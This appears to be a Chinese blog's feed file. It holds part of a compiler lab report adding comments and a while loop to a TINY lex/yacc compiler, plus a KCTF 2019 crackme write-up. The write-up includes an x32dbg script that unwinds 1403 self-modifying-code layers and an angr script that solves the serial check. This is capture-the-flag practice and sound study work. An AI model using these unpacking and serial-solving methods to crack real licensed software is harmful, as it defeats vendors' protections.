                  if (c == '\n') lineno++;                  } while (c != '}');                }.               {return ERROR;}%%int yywrap(){ return 1;}TokenType getToken(void){ static int firstTime = TRUE;  TokenType currentToken;  if (firstTime)  { firstTime = FALSE;    lineno++;    yyin = source;    yyout = listing;  }  currentToken = yylex();  strncpy(tokenString,yytext,MAXTOKENLEN);  if (TraceScan) {    fprintf(listing,"\t%d: ",lineno);    printToken(currentToken,tokenString);  }  return currentToken;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加<code>//</code> 和 <code>/* */</code>的规则</p><pre class="line-numbers language-C"><code class="language-C">"//"             { char c;                  do                  { c = input();                    if (c == EOF) break;                  } while (c != '\n');                }"/*"             { char c;                   int d=0;                  do                  { c = input();                    if (c == '/'&&d==1)                    d=2;                    else if(c !='/'&&d==1)                     d=0;                    if (c == EOF) break;                    if (c == '\n') lineno++;                    if (c == '*') d=1;                  } while (d != 2);                }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h4><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111132822132.png" alt="image-20200111132822132"></p><h3 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h3><p>需要先修改tiny.l使其多识别一种符号</p><pre class="line-numbers language-C"><code class="language-C">"while"         {return WHILE;}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语法规则主要在YACC中，添加 while 语法在tiny.y文件中增加声明和定义</p><pre class="line-numbers language-C"><code class="language-C">%token WHILEwhile_stmt     : WHILE exp THEN stmt_seq END                 { $$ = newStmtNode(WHILEK);                   $$->child[0] = $2;                   $$->child[1] = $4;                 }            ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>newStmtNode(WHILEK)</code> </p><p>还需要修改<code>cgen</code>文件，增加对于<code>WHILEK</code>的处理</p><pre class="line-numbers language-c"><code class="language-c">      <span class="token keyword">case</span> WHILEK <span class="token punctuation">:</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>TraceCode<span class="token punctuation">)</span> <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"-> while"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         p1 <span class="token operator">=</span> tree<span class="token operator">-></span>child<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>         p2 <span class="token operator">=</span> tree<span class="token operator">-></span>child<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* generate code for test expression */</span>         savedLoc1 <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">cGen</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>         savedLoc2 <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"while: jump to else belongs here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">cGen</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">emitRM_Abs</span><span class="token punctuation">(</span><span class="token string">"LDA"</span><span class="token punctuation">,</span>pc<span class="token punctuation">,</span>savedLoc1<span class="token punctuation">,</span><span class="token string">"jmp to end"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* recurse on then part */</span>         currentLoc <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitBackup</span><span class="token punctuation">(</span>savedLoc2<span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitRM_Abs</span><span class="token punctuation">(</span><span class="token string">"JEQ"</span><span class="token punctuation">,</span>ac<span class="token punctuation">,</span>currentLoc<span class="token punctuation">,</span><span class="token string">"while: jmp to else"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">emitRestore</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>TraceCode<span class="token punctuation">)</span>  <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"&lt;- while"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* WHILEK_k */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tny文件修改为,从10 倒序打印</p><pre class="line-numbers language-c"><code class="language-c"><span class="token punctuation">{</span> Sample program  in TINY language <span class="token operator">-</span>  computes factorial<span class="token punctuation">}</span>read x<span class="token comment" spellcheck="true">// sssss</span><span class="token comment" spellcheck="true">/* ddd */</span><span class="token punctuation">;</span> <span class="token punctuation">{</span> input an integer <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">&lt;</span> x then <span class="token punctuation">{</span> don't compute <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">}</span>  fact <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  repeat    fact <span class="token punctuation">:</span><span class="token operator">=</span> fact <span class="token operator">*</span> x<span class="token punctuation">;</span>    x <span class="token punctuation">:</span><span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">1</span>  until x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  write fact  <span class="token punctuation">{</span> output factorial of x <span class="token punctuation">}</span>end<span class="token punctuation">;</span>y <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token number">0</span> <span class="token operator">&lt;</span> y then  y <span class="token punctuation">:</span><span class="token operator">=</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>  write yend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>语法树：</p><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111153138350.png" alt="image-20200111153138350"></p><p>运行的效果：</p><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111153205806.png" alt="image-20200111153205806"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>KCTF 总决赛第四题</title>
      <link href="/2019/12/30/kctf-zong-jue-sai-di-si-ti/"/>
      <url>/2019/12/30/kctf-zong-jue-sai-di-si-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="西部乐园-WP"><a href="#西部乐园-WP" class="headerlink" title="西部乐园 WP"></a>西部乐园 WP</h1><h1 id="第六题-三道八佛"><a href="#第六题-三道八佛" class="headerlink" title="第六题 三道八佛"></a>第六题 三道八佛</h1><blockquote><p>题目信息：Windows </p><p>题目来源：2019 看雪CTF总决赛</p></blockquote><p>打了一次看雪总决赛，这是选取了其中的第六题，最后是由队友提交的writeup，所以会在看雪论坛找到同样的过程。</p><p>题目是多层SMC完成的对于代码的加密，使用OD加载程序以后发现跑起来非常的卡。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111011819888.png" alt="image-20200111011819888"></p><p>由于SMC的代码量很大，所以在OD中不太好用，我选择了x32dbg。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111012429056.png" alt="image-20200111012429056"></p><p>由于采用了多层的smc，所以在ida中是无法直接分析算法的。</p><p>程序开头进行两个 <strong>VirtualProtect</strong> 进行修改.修改属性为可读写执行. 下面会不断的进行代码重定位.并且操作 <strong>FS:[4] FS:[8]</strong> 等来进行保存用户输入的UserName 以及 序列号</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/723188_7CW2JQEEDFDXY5Z.png" alt="img"></p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013459617.png" alt="image-20200111013459617"></p><p>动态跑起来，可以发现最初输入的KCTF 被填充了。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013823999.png" alt="image-20200111013823999"></p><p>下面的call eax 就是进行切换堆栈，并且跳入下一层smc 中。并且开始抹除原始代码。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013943021.png" alt="image-20200111013943021"></p><pre><code>$calleax = 0$num = 0$jnzaddr = 0$f = 0$prevaddr = 0$retaddr=0$hasj=0bph 004014DFrun//input the username and passwordbphcstart:find cip,FFD0,0x200cmp $result,0je overmov $calleax,$resultbph $calleaxrunbphcinc $numStepIntoStepIntoStepOvermov $jnzaddr,cipfind_jnz:find cip,8BE55DC3,0x220cmp $result,0je nobpmov $retaddr,$resultbph $retaddr+3runbphcStepIntoStepIntoinc $nummov $jnzaddr,cipnobp:find jnzaddr,75??,0x200cmp $result,0jnz isjnzjnzs:find cip,0F85????????,0x200cmp $result,0jnz isjnzsjmp nofoundruntojnz:mov f,0bph $jnzaddr+2mov $hasj,1jmp jnzsruntojnzs:mov f,0mov $jnzaddr,$resultbph $jnzaddr+6runbphc mov $hasj,0nofound:cmp $hasj,1jnz nojumpmov $hasj,0runbphcnojump:jmp startisjnz:mov $jnzaddr,$result$prevaddr = dis.prev($jnzaddr)$prevaddr = $prevaddr + dis.len($prevaddr)cmp $prevaddr,$jnzaddrje runtojnzadd $jnzaddr,2jmp find_jnzisjnzs:mov $jnzaddr,$result$prevaddr = dis.prev($jnzaddr)$prevaddr = $prevaddr + dis.len($prevaddr)cmp $prevaddr,$jnzaddrje runtojnzscmp $hasj,1jnz nojjmp nofoundnoj:add $jnzaddr,2jmp find_jnzover:cmp f,0jnz endmov f,1jnzaddr=cipjmp find_jnzend:log decryptnum:{$num}msg &quot;over&quot;</code></pre><p>通过比对进入smc时的特征，使用x32dbg脚本，跑完发现有1403层smc，用脚本跑到最后一层，发现下面的代码是完整的函数，代码很长，还有很多重定位和混淆，故先全部提取到code文件并修正一下esi。</p><p>用IDA分析code文件，先修改基址为0x1A1857E，F5代码如下。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111014720242.png" alt="image-20200111014720242"></p><p>代码比较清晰了，serial经过计算，跟用户名比较，如果相同则成功。</p><p>注意KCTF用户名不足16位，后面的填充数据也是要比较的。也就是说实际上比较的是</p><blockquote><p>4B 43 54 46 00 1A 19 18 17 16 15 14 13 12 11 10 00</p></blockquote><p>因为代码还是有点看不太懂的，所以提取反编译以后的代码，放到VS中重新编译成exe以后使用angr跑出来flag。  angr 的python代码如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    load_option <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    b <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./ConsoleApplication21.exe"</span><span class="token punctuation">,</span> load_options<span class="token operator">=</span>load_option<span class="token punctuation">)</span>    state <span class="token operator">=</span> b<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x401040</span><span class="token punctuation">)</span>    concrete_addr <span class="token operator">=</span> <span class="token number">0x404378</span>    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'flag_%d'</span> <span class="token operator">%</span> i<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars<span class="token punctuation">)</span>    state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>concrete_addr<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>    sm <span class="token operator">=</span> b<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>state<span class="token punctuation">)</span>    <span class="token keyword">print</span> sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x4013A3</span><span class="token punctuation">)</span>    found <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    temp <span class="token operator">=</span> <span class="token punctuation">(</span>found<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> temp    solution <span class="token operator">=</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> cast_to<span class="token operator">=</span>str<span class="token punctuation">)</span>    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> solution<span class="token punctuation">:</span>        s<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> s    <span class="token keyword">print</span> solution<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>    <span class="token keyword">print</span> flag<span class="token punctuation">,</span> found<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后成功跑出结果。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111014829398.png" alt="image-20200111014829398"></p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> 看雪CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hookme</title>
      <link href="/2019/12/26/hookme/"/>
      <url>/2019/12/26/hookme/</url>
      
        <content type="html"><![CDATA[<h1 id="新的博客开始啦"><a href="#新的博客开始啦" class="headerlink" title="新的博客开始啦~"></a>新的博客开始啦~</h1><p>认真整理东西！！！ 冲！</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
